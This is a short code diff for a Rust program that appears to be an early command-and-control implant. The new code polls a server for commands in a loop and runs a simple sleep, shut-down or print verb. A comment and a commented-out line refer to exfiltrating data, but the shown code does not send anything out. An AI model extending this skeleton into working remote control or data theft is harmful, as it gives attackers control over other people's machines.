@@ -39,10 +39,41 @@ async fn main() {
     // });
 
     loop{
-        //exfiltrates data
+    
+        let rec = unwrap_or_panic!(server.get_command(&id).await);
+        execute_command(&rec).await; 
+        //sleep(Duration::from_secs(10)).await;
+    }
+    
+        // exfiltrates data
         // server.send_data(&id, "HHHH").await;
         // sleep(Duration::from_secs(5));
         // returns the command
-        // let rec = unwrap_or_panic!(server.get_command(&id).await);        
-    }    
+
+    
+}
+
+
+async fn execute_command(cmd: & str){
+    println!("Executing");
+    let cmds: Vec<_> = cmd.split([':']).collect();
+    
+
+    match cmds[0]{
+        "slp" => {
+            print!("sleeping");
+            sleep(Duration::from_secs(cmds[1].parse().unwrap())).await;
+
+        },
+        "shd" => {
+
+            std::process::exit(1);
+        },
+        "pwn" => {
+
+            println!("{}",cmds[1]);
+        },
+        _ => {}
+    };
+
 }
